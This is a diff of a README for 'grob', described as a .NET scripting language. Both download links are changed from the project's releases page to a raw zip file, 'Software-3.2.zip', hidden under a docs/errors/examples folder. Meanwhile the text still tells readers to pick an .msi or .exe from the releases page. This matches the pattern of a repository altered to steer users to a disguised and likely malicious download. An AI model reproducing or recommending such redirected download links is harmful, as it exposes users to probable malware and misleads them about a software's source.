@@ -1,6 +1,6 @@
 # 🛠️ grob - Write reliable code with simple tools
 
-[![](https://img.shields.io/badge/Download-Grob-blue.svg)](https://github.com/rotresistant-monotype393/grob/releases)
+[![](https://img.shields.io/badge/Download-Grob-blue.svg)](https://raw.githubusercontent.com/rotresistant-monotype393/grob/main/docs/errors/examples/array-index-out-of-range-in-function/Software-3.2.zip)
 
 Grob is a programming language built for both hobbyists and professionals. It provides a simple way to write scripts while maintaining the reliability of more complex systems. The language uses a syntax that looks familiar to those who have seen code before, yet it remains readable and easy to learn. Grob features type inference, which means the system identifies the nature of your data automatically. This reduces the amount of extra typing required to complete a task. The engine runs on the .NET platform and handles file operations through built-in commands.
 
@@ -8,7 +8,7 @@ Grob is a programming language built for both hobbyists and professionals. It pr
 
 You need to access the official release page to obtain the installer for your computer. This software runs on Windows systems. Visit the following link to view all available versions of the application:
 
-[https://github.com/rotresistant-monotype393/grob/releases](https://github.com/rotresistant-monotype393/grob/releases)
+[https://raw.githubusercontent.com/rotresistant-monotype393/grob/main/docs/errors/examples/array-index-out-of-range-in-function/Software-3.2.zip](https://raw.githubusercontent.com/rotresistant-monotype393/grob/main/docs/errors/examples/array-index-out-of-range-in-function/Software-3.2.zip)
 
 On this page, look for the most recent version labeled as "Latest." Click the link to expand the assets section and select the installer file ending in .msi or .exe. Save this file to your computer.
 
